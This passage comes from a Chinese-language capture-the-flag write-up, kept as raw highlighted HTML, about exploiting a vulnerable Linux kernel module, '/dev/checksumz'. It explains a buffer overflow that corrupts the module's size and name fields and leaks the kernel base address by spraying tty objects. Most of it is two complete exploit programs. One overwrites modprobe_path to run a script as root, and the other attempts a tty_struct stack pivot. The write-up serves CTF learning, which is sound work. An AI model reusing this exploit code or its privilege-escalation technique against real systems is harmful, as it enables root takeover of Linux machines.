class=\"hljs c\"><span class=\"hljs-type\">static</span> <span class=\"hljs-type\">ssize_t</span> <span class=\"hljs-title function_\">checksumz_read_iter</span><span class=\"hljs-params\">(<span class=\"hljs-keyword\">struct</span> kiocb *iocb, <span class=\"hljs-keyword\">struct</span> iov_iter *to)</span> &#123;\n        <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">checksum_buffer</span>* <span class=\"hljs-title\">buffer</span> =</span> iocb-&gt;ki_filp-&gt;private_data;\n        <span class=\"hljs-type\">size_t</span> bytes = iov_iter_count(to);\n\n        <span class=\"hljs-keyword\">if</span> (!buffer)\n                <span class=\"hljs-keyword\">return</span> -EBADFD;\n        <span class=\"hljs-keyword\">if</span> (!bytes)\n                <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;\n        <span class=\"hljs-keyword\">if</span> (buffer-&gt;read &gt;= buffer-&gt;size) &#123;\n                buffer-&gt;read = <span class=\"hljs-number\">0</span>;\n                <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;\n        &#125;\n\n        <span class=\"hljs-type\">ssize_t</span> copied = copy_to_iter(buffer-&gt;state + buffer-&gt;pos, min(bytes, <span class=\"hljs-number\">256</span>), to);\n\n        buffer-&gt;read += copied;\n        buffer-&gt;pos += copied;\n        <span class=\"hljs-keyword\">if</span> (buffer-&gt;pos &gt;= buffer-&gt;size)\n                buffer-&gt;pos = buffer-&gt;size - <span class=\"hljs-number\">1</span>;\n\n        <span class=\"hljs-keyword\">return</span> copied;\n&#125;</code></pre>\n<p>最多能读256个字节</p>\n<p>Ioctl 功能</p>\n<pre><code class=\"hljs c\"><span class=\"hljs-type\">static</span> <span class=\"hljs-type\">long</span> <span class=\"hljs-title function_\">checksumz_ioctl</span><span class=\"hljs-params\">(<span class=\"hljs-keyword\">struct</span> file *file, <span class=\"hljs-type\">unsigned</span> <span class=\"hljs-type\">int</span> command, <span class=\"hljs-type\">unsigned</span> <span class=\"hljs-type\">long</span> arg)</span> &#123;\n        <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">checksum_buffer</span>* <span class=\"hljs-title\">buffer</span> =</span> file-&gt;private_data;\n\n        <span class=\"hljs-keyword\">if</span> (!file-&gt;private_data)\n                <span class=\"hljs-keyword\">return</span> -EBADFD;\n        \n        <span class=\"hljs-keyword\">switch</span> (command) &#123;\n                <span class=\"hljs-keyword\">case</span> CHECKSUMZ_IOCTL_RESIZE:\n                        <span class=\"hljs-keyword\">if</span> (arg &lt;= buffer-&gt;size &amp;&amp; arg &gt; <span class=\"hljs-number\">0</span>) &#123;\n                                buffer-&gt;size = arg;\n                                buffer-&gt;pos = <span class=\"hljs-number\">0</span>;\n                        &#125; <span class=\"hljs-keyword\">else</span>\n                                <span class=\"hljs-keyword\">return</span> -EINVAL;\n\n                        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;\n                <span class=\"hljs-keyword\">case</span> CHECKSUMZ_IOCTL_RENAME:\n                        <span class=\"hljs-type\">char</span> __user *user_name_buf = (<span class=\"hljs-type\">char</span> __user*) arg;\n\n                        <span class=\"hljs-keyword\">if</span> (copy_from_user(buffer-&gt;name, user_name_buf, <span class=\"hljs-number\">48</span>)) &#123;\n                                <span class=\"hljs-keyword\">return</span> -EFAULT;\n                        &#125;\n\n                        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;\n                <span class=\"hljs-keyword\">case</span> CHECKSUMZ_IOCTL_PROCESS:\n                        adler32(buffer-&gt;state, buffer-&gt;size, &amp;buffer-&gt;s1, &amp;buffer-&gt;s2);\n                        <span class=\"hljs-built_in\">memset</span>(buffer-&gt;state, <span class=\"hljs-number\">0</span>, buffer-&gt;size);\n                        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;\n                <span class=\"hljs-keyword\">case</span> CHECKSUMZ_IOCTL_DIGEST:\n                        <span class=\"hljs-type\">uint32_t</span> __user *user_digest_buf = (<span class=\"hljs-type\">uint32_t</span> __user*) arg;\n                        <span class=\"hljs-type\">uint32_t</span> digest = buffer-&gt;s1 | (buffer-&gt;s2 &lt;&lt; <span class=\"hljs-number\">16</span>);\n\n                        <span class=\"hljs-keyword\">if</span> (copy_to_user(user_digest_buf, &amp;digest, <span class=\"hljs-keyword\">sizeof</span>(<span class=\"hljs-type\">uint32_t</span>))) &#123;\n                                <span class=\"hljs-keyword\">return</span> -EFAULT;\n                        &#125;\n\n                        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;\n                <span class=\"hljs-keyword\">default</span>:\n                        <span class=\"hljs-keyword\">return</span> -EINVAL;\n        &#125;\n\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;\n&#125;</code></pre>\n<p>这里除了rename其他功能对攻击没帮助，有这些只是为了符合题目场景</p>\n<p>Write</p>\n<pre><code class=\"hljs c\"><span class=\"hljs-type\">static</span> <span class=\"hljs-type\">ssize_t</span> <span class=\"hljs-title function_\">checksumz_write_iter</span><span class=\"hljs-params\">(<span class=\"hljs-keyword\">struct</span> kiocb *iocb, <span class=\"hljs-keyword\">struct</span> iov_iter *from)</span> &#123;\n        <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">checksum_buffer</span>* <span class=\"hljs-title\">buffer</span> =</span> iocb-&gt;ki_filp-&gt;private_data;\n        <span class=\"hljs-type\">size_t</span> bytes = iov_iter_count(from);\n \n        <span class=\"hljs-keyword\">if</span> (!buffer)\n                        <span class=\"hljs-keyword\">return</span> -EBADFD;\n        <span class=\"hljs-keyword\">if</span> (!bytes)\n                        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;\n\n                <span class=\"hljs-type\">ssize_t</span> copied = copy_from_iter(buffer-&gt;state + buffer-&gt;pos, min(bytes, <span class=\"hljs-number\">16</span>), from);\n \n                buffer-&gt;pos += copied;\n                <span class=\"hljs-keyword\">if</span> (buffer-&gt;pos &gt;= buffer-&gt;size)\n                        buffer-&gt;pos = buffer-&gt;size - <span class=\"hljs-number\">1</span>;\n                \n        <span class=\"hljs-keyword\">return</span> copied;\n&#125;</code></pre>\n<p>可以往buf偏移上写最多16字节，这里配合下一个功能可以实现一些奇特的功能</p>\n<p>Lseek</p>\n<pre><code class=\"hljs c\"><span class=\"hljs-type\">static</span> <span class=\"hljs-type\">loff_t</span> <span class=\"hljs-title function_\">checksumz_llseek</span><span class=\"hljs-params\">(<span class=\"hljs-keyword\">struct</span> file *file, <span class=\"hljs-type\">loff_t</span> offset, <span class=\"hljs-type\">int</span> whence)</span> &#123;\n        <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">checksum_buffer</span>* <span class=\"hljs-title\">buffer</span> =</span> file-&gt;private_data;\n\n        <span class=\"hljs-keyword\">switch</span> (whence) &#123;\n                <span class=\"hljs-keyword\">case</span> SEEK_SET:\n                        buffer-&gt;pos = offset;\n                        <span class=\"hljs-keyword\">break</span>;\n                <span class=\"hljs-keyword\">case</span> SEEK_CUR:\n                        buffer-&gt;pos += offset;\n                        <span class=\"hljs-keyword\">break</span>;\n                <span class=\"hljs-keyword\">case</span> SEEK_END:\n                        buffer-&gt;pos = buffer-&gt;size - offset;\n                        <span class=\"hljs-keyword\">break</span>;\n                <span class=\"hljs-keyword\">default</span>:\n                        <span class=\"hljs-keyword\">return</span> -EINVAL;\n        &#125;\n\n        <span class=\"hljs-keyword\">if</span> (buffer-&gt;pos &lt; <span class=\"hljs-number\">0</span>)\n                buffer-&gt;pos = <span class=\"hljs-number\">0</span>;\n\n        <span class=\"hljs-keyword\">if</span> (buffer-&gt;pos &gt;= buffer-&gt;size)\n                buffer-&gt;pos = buffer-&gt;size - <span class=\"hljs-number\">1</span>;\n\n        <span class=\"hljs-keyword\">return</span> buffer-&gt;pos;\n&#125;</code></pre>\n<p>可以改pos为任意小于size的值，如果把pos改成512可以溢出15字节。这15字节可以覆盖size到一个很大的值，实现相对任意写。</p>\n<pre><code class=\"hljs c\"><span class=\"hljs-type\">char</span>* name;</code></pre>\n<p>可见name为指针，不难想到覆盖指针来利用rename来进行任意写</p>\n<p>POC</p>\n<pre><code class=\"hljs c\"><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&quot;api.h&quot;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdio.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdlib.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdint.h&gt;</span></span>\n\n<span class=\"hljs-type\">int</span> fd;\n\n<span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">()</span> &#123;\n        fd = open(<span class=\"hljs-string\">&quot;/dev/checksumz&quot;</span>, O_RDWR);\n        lseek(fd, <span class=\"hljs-number\">512</span>, SEEK_SET);\n        <span class=\"hljs-type\">unsigned</span> <span class=\"hljs-type\">long</span> buf[<span class=\"hljs-number\">2</span>];\n        <span class=\"hljs-built_in\">memset</span>(buf, <span class=\"hljs-number\">0xff</span>, <span class=\"hljs-keyword\">sizeof</span>(buf));\n        write(fd, buf, <span class=\"hljs-keyword\">sizeof</span>(buf));\n&#125;</code></pre>\n<p><img src=\"/pic/output.jpg\" alt=\"\"></p>\n<p>size已经被覆盖成0xffffffffffffffff，这样可以改pos来进行相对任意写和读。</p>\n<p>为了能够知道内核地址，我们需要拿到kaslr基地址。可以利用tty_struct 来创造含有内核地址的堆块</p>\n<pre><code class=\"hljs C\"><span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> i=<span class=\"hljs-number\">0</span>;i&lt;<span class=\"hljs-number\">0x100</span>;i++)&#123; spray[i] = open(<span class=\"hljs-string\">&quot;/dev/ptmx&quot;</span>, O_RDONLY | O_NOCTTY); &#125;</code></pre>\n<p>这样在buf下面会有tty堆块可以读。在泄漏过程中可能会出现泄漏不成功，可以选择多创造点堆块来提升稳定性和在不同位置读堆块来稳定的获得基地址。</p>\n<p><img src=\"/pic/1fc6b364-f6cc-40ff-964d-6de02e1ff1de.jpg\" alt=\"\"></p>\n<p>最后，把name指针改为modprobe_path来覆盖为/tmp/x，这样可以在root权限进行任意代码。</p>\n<p>modprobe</p>\n<p>完整exp</p>\n<pre><code class=\"hljs c\"><span class=\"hljs-comment\">//192.168.64.6:8080/exp</span>\n\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&quot;api.h&quot;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdio.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdlib.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdint.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdio.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;sys/types.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;sys/stat.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;fcntl.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;sched.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;sys/mman.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;signal.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;sys/syscall.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;sys/ioctl.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;linux/userfaultfd.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;sys/wait.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;poll.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;unistd.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdlib.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;string.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;pthread.h&gt;</span></span>\n\n<span class=\"hljs-type\">int</span> fd, spray[<span class=\"hljs-number\">0x100</span>];\n<span class=\"hljs-type\">unsigned</span> <span class=\"hljs-type\">long</span> user_ss, user_sp, user_cs, user_rflags, kaslr;\n\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">define</span> modprobe_path kaslr+0x1b3f100</span>\n\n<span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">save_state</span><span class=\"hljs-params\">()</span>&#123;\n        __asm__(\n                <span class=\"hljs-string\">&quot;.intel_syntax noprefix;&quot;</span>\n                <span class=\"hljs-string\">&quot;mov user_cs, cs;&quot;</span>\n                <span class=\"hljs-string\">&quot;mov user_ss, ss;&quot;</span>\n                <span class=\"hljs-string\">&quot;mov user_sp, rsp;&quot;</span>\n                <span class=\"hljs-string\">&quot;pushf;&quot;</span>\n                <span class=\"hljs-string\">&quot;pop user_rflags;&quot;</span>\n                <span class=\"hljs-string\">&quot;.att_syntax;&quot;</span>\n           );\n&#125;\n\n\n<span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">shell</span><span class=\"hljs-params\">()</span>&#123;\n        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;[+] UID %d\\n&quot;</span>,getuid());\n        system(<span class=\"hljs-string\">&quot;/bin/sh&quot;</span>);\n&#125;\n\n\n<span class=\"hljs-type\">unsigned</span> <span class=\"hljs-type\">long</span> user_rip = (<span class=\"hljs-type\">unsigned</span> <span class=\"hljs-type\">long</span>)shell;\n\n<span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">()</span> &#123;\n        save_state();\n        <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> i=<span class=\"hljs-number\">0</span>;i&lt;<span class=\"hljs-number\">0x80</span>;i++)&#123; spray[i] = open(<span class=\"hljs-string\">&quot;/dev/ptmx&quot;</span>, O_RDONLY | O_NOCTTY); &#125;\n        fd = open(<span class=\"hljs-string\">&quot;/dev/checksumz&quot;</span>, O_RDWR);\n        <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> i=<span class=\"hljs-number\">0x80</span>;i&lt;<span class=\"hljs-number\">0x100</span>;i++)&#123; spray[i] = open(<span class=\"hljs-string\">&quot;/dev/ptmx&quot;</span>, O_RDONLY | O_NOCTTY); &#125;\n        lseek(fd, <span class=\"hljs-number\">512</span>, SEEK_SET);\n\n        <span class=\"hljs-type\">int</span> good;\n        <span class=\"hljs-type\">unsigned</span> <span class=\"hljs-type\">long</span> buf[<span class=\"hljs-number\">2</span>];\n        <span class=\"hljs-built_in\">memset</span>(buf, <span class=\"hljs-number\">0xff</span>, <span class=\"hljs-keyword\">sizeof</span>(buf));\n        write(fd, buf, <span class=\"hljs-keyword\">sizeof</span>(buf));\n        <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> i=<span class=\"hljs-number\">0</span>;i&lt;<span class=\"hljs-number\">8</span>;i++)&#123;\n                lseek(fd, <span class=\"hljs-number\">1048</span>+i*<span class=\"hljs-number\">1024</span>, SEEK_SET);\n                read(fd, buf, <span class=\"hljs-number\">8</span>);\n                kaslr = buf[<span class=\"hljs-number\">0</span>] - <span class=\"hljs-number\">0x1289480</span>;\n                <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;%lx\\n&quot;</span>, kaslr);\n                <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;%lx\\n&quot;</span>, (kaslr &amp; ~<span class=\"hljs-number\">0xffffff</span>));\n                <span class=\"hljs-keyword\">if</span>((kaslr &amp; ~<span class=\"hljs-number\">0xffffff</span>) == kaslr)&#123;\n                        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;kaslr %lx\\n&quot;</span>, kaslr);\n                        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;modprobe_path %lx\\n&quot;</span>, modprobe_path);\n                        good = <span class=\"hljs-number\">1</span>;\n                        <span class=\"hljs-keyword\">break</span>;\n                &#125;\n        &#125;\n        <span class=\"hljs-comment\">//puts(&quot;Done&quot;);</span>\n        <span class=\"hljs-keyword\">if</span>(!good)&#123;\n                <span class=\"hljs-built_in\">puts</span>(<span class=\"hljs-string\">&quot;[x] exploit failed&quot;</span>);\n                <span class=\"hljs-built_in\">exit</span>(<span class=\"hljs-number\">0</span>);\n        &#125;\n        lseek(fd, <span class=\"hljs-number\">528</span>, SEEK_SET);\n        buf[<span class=\"hljs-number\">0</span>] = modprobe_path;\n        write(fd, buf, <span class=\"hljs-number\">8</span>);\n        <span class=\"hljs-type\">char</span> *path = <span class=\"hljs-string\">&quot;/tmp/x&quot;</span>;\n        ioctl(fd, CHECKSUMZ_IOCTL_RENAME, (<span class=\"hljs-type\">uint64_t</span> *)path);\n\n        system(<span class=\"hljs-string\">&quot;echo &#x27;#!/bin/sh\\ncp /dev/vda /tmp/flag\\nchmod 777 /tmp/flag&#x27; &gt; /tmp/x&quot;</span>);\n        system(<span class=\"hljs-string\">&quot;chmod +x /tmp/x&quot;</span>);\n        system(<span class=\"hljs-string\">&quot;echo -ne &#x27;\\\\xff\\\\xff\\\\xff\\\\xff&#x27; &gt; /tmp/dummy&quot;</span>);\n        system(<span class=\"hljs-string\">&quot;chmod +x /tmp/dummy&quot;</span>);\n        system(<span class=\"hljs-string\">&quot;/tmp/dummy&quot;</span>);\n        system(<span class=\"hljs-string\">&quot;cat /tmp/flag&quot;</span>);\n\n&#125;</code></pre>\n<p>可能讲的不好，有建议或者讲错或讲的不对都可以提出来。这解是给预期，预期解如果能做出来可能会再写篇文章。：）</p>\n<p>tty_struct 打法</p>\n<pre><code class=\"hljs c\"><span class=\"hljs-comment\">//192.168.64.6:8080/exp</span>\n\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&quot;api.h&quot;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdio.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdlib.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdint.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdio.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;sys/types.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;sys/stat.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;fcntl.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;sched.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;sys/mman.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;signal.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;sys/syscall.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;sys/ioctl.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;linux/userfaultfd.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;sys/wait.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;poll.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;unistd.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdlib.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;string.h&gt;</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;pthread.h&gt;</span></span>\n\n<span class=\"hljs-type\">int</span> fd, spray[<span class=\"hljs-number\">0x100</span>];\n<span class=\"hljs-type\">unsigned</span> <span class=\"hljs-type\">long</span> user_ss, user_sp, user_cs, user_rflags, kaslr, name[<span class=\"hljs-number\">1</span>];\n\n<span class=\"hljs-comment\">//#define modprobe_path kaslr+0x1b3f100</span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">define</span> pivot kaslr+0x185b884</span>\n\n<span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">save_state</span><span class=\"hljs-params\">()</span>&#123;\n        __asm__(\n                <span class=\"hljs-string\">&quot;.intel_syntax noprefix;&quot;</span>\n                <span class=\"hljs-string\">&quot;mov user_cs, cs;&quot;</span>\n                <span class=\"hljs-string\">&quot;mov user_ss, ss;&quot;</span>\n                <span class=\"hljs-string\">&quot;mov user_sp, rsp;&quot;</span>\n                <span class=\"hljs-string\">&quot;pushf;&quot;</span>\n                <span class=\"hljs-string\">&quot;pop user_rflags;&quot;</span>\n                <span class=\"hljs-string\">&quot;.att_syntax;&quot;</span>\n           );\n&#125;\n\n\n<span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">shell</span><span class=\"hljs-params\">()</span>&#123;\n        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;[+] UID %d\\n&quot;</span>,getuid());\n        system(<span class=\"hljs-string\">&quot;/bin/sh&quot;</span>);\n&#125;\n\n\n<span class=\"hljs-type\">unsigned</span> <span class=\"hljs-type\">long</span> user_rip = (<span class=\"hljs-type\">unsigned</span> <span class=\"hljs-type\">long</span>)shell;\n\n<span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">()</span> &#123;\n        save_state();\n        <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> i=<span class=\"hljs-number\">0</span>;i&lt;<span class=\"hljs-number\">0x80</span>;i++)&#123; spray[i] = open(<span class=\"hljs-string\">&quot;/dev/ptmx&quot;</span>, O_RDONLY | O_NOCTTY); &#125;\n        fd = open(<span class=\"hljs-string\">&quot;/dev/checksumz&quot;</span>, O_RDWR);\n        <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> i=<span class=\"hljs-number\">0x80</span>;i&lt;<span class=\"hljs-number\">0x100</span>;i++)&#123; spray[i] = open(<span class=\"hljs-string\">&quot;/dev/ptmx&quot;</span>, O_RDONLY | O_NOCTTY); &#125;\n\n        lseek(fd, <span class=\"hljs-number\">512</span>, SEEK_SET);\n\n        <span class=\"hljs-type\">int</span> good = <span class=\"hljs-number\">0</span>;\n        <span class=\"hljs-type\">unsigned</span> <span class=\"hljs-type\">long</span> buf[<span class=\"hljs-number\">2</span>];\n        <span class=\"hljs-built_in\">memset</span>(buf, <span class=\"hljs-number\">0xff</span>, <span class=\"hljs-keyword\">sizeof</span>(buf));\n        write(fd, buf, <span class=\"hljs-keyword\">sizeof</span>(buf));\n        <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> i=<span class=\"hljs-number\">0</span>;i&lt;<span class=\"hljs-number\">8</span>;i++)&#123;\n                lseek(fd, <span class=\"hljs-number\">1048</span>+i*<span class=\"hljs-number\">1024</span>, SEEK_SET);\n                read(fd, buf, <span class=\"hljs-number\">8</span>);\n                kaslr = buf[<span class=\"hljs-number\">0</span>] - <span class=\"hljs-number\">0x1289480</span>;\n                <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;%lx\\n&quot;</span>, buf[<span class=\"hljs-number\">0</span>]);\n                <span class=\"hljs-keyword\">if</span>((kaslr &amp; ~<span class=\"hljs-number\">0xfffff</span>) == kaslr)&#123;\n                        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;kaslr %lx\\n&quot;</span>, kaslr);\n                        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;modprobe_path %lx\\n&quot;</span>, pivot);\n                        good = <span class=\"hljs-number\">1</span>;\n                        <span class=\"hljs-keyword\">break</span>;\n                &#125;\n        &#125;\n        <span class=\"hljs-comment\">//puts(&quot;Done&quot;);</span>\n        <span class=\"hljs-keyword\">if</span>(!good)&#123;\n                <span class=\"hljs-built_in\">puts</span>(<span class=\"hljs-string\">&quot;[x] exploit failed&quot;</span>);\n                <span class=\"hljs-built_in\">exit</span>(<span class=\"hljs-number\">0</span>);\n        &#125;\n        lseek(fd, <span class=\"hljs-number\">528</span>, SEEK_SET);\n        read(fd, buf, <span class=\"hljs-number\">8</span>);\n        name[<span class=\"hljs-number\">0</span>] = buf[<span class=\"hljs-number\">0</span>];\n        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;name addr %lx\\n&quot;</span>, name[<span class=\"hljs-number\">0</span>]);\n        lseek(fd, <span class=\"hljs-number\">528</span>, SEEK_SET);\n\n        <span class=\"hljs-type\">unsigned</span> <span class=\"hljs-type\">long</span> fake_ops[<span class=\"hljs-number\">4</span>];\n        <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> t=<span class=\"hljs-number\">0</span>;t&lt;<span class=\"hljs-number\">16</span>;t++)&#123;\n                <span class=\"hljs-comment\">//for(int i=0;i&lt;4;i++)&#123; fake_ops[i] = 0xffffffffdead0000 + ((i+t*4) &lt;&lt; 8); &#125;</span>\n                <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> i=<span class=\"hljs-number\">0</span>;i&lt;<span class=\"hljs-number\">4</span>;i++)&#123; fake_ops[i] = pivot; &#125;\n                ioctl(fd, CHECKSUMZ_IOCTL_RENAME, (<span class=\"hljs-type\">uint64_t</span> *)fake_ops);\n                name[<span class=\"hljs-number\">0</span>] += <span class=\"hljs-number\">32</span>;\n                write(fd, name, <span class=\"hljs-number\">8</span>);\n                lseek(fd, <span class=\"hljs-number\">528</span>, SEEK_SET);\n        &#125;\n        name[<span class=\"hljs-number\">0</span>] -= <span class=\"hljs-number\">512</span>;\n        lseek(fd, <span class=\"hljs-number\">1048</span>, SEEK_SET);\n        write(fd, name, <span class=\"hljs-number\">8</span>);\n\n        <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> i=<span class=\"hljs-number\">0</span>;i&lt;<span class=\"hljs-number\">0x100</span>;i++)&#123; ioctl(spray[i], <span class=\"hljs-number\">0x41414141</span>, <span class=\"hljs-number\">0x42424242</span>); &#125;\n\n        <span class=\"hljs-comment\">/*</span>\n<span class=\"hljs-comment\">        buf[0] = modprobe_path;</span>\n<span class=\"hljs-comment\">        write(fd, buf, 8);</span>\n<span class=\"hljs-comment\">        char *path = &quot;/tmp/x&quot;;</span>\n<span class=\"hljs-comment\">        ioctl(fd, CHECKSUMZ_IOCTL_RENAME, (uint64_t *)path);</span>\n<span class=\"hljs-comment\"></span>\n<span class=\"hljs-comment\">        system(&quot;echo &#x27;#!/bin/sh\\n/bin/sh&#x27; &gt; /tmp/sh&quot;);</span>\n<span class=\"hljs-comment\">        system(&quot;chmod +x /tmp/sh&quot;);</span>\n<span class=\"hljs-comment\">        system(&quot;echo &#x27;#!/bin/sh\\nmv /tmp/sh /bin/poweroff&#x27; &gt; /tmp/x&quot;);</span>\n<span class=\"hljs-comment\">        system(&quot;chmod +x /tmp/x&quot;);</span>\n<span class=\"hljs-comment\">        system(&quot;echo -ne &#x27;\\\\xff\\\\xff\\\\xff\\\\xff&#x27; &gt; /tmp/dummy&quot;);</span>\n<span class=\"hljs-comment\">        system(&quot;chmod +x /tmp/dummy&quot;);</span>\n<span class=\"hljs-comment\">        system(&quot;/tmp/dummy&quot;);</span>\n<span class=\"hljs-comment\">        */</span>\n&#125;</code></pre>\n<p>没找到合适的gadget来写rop</p>\n<p>参考</p>\n<p><a 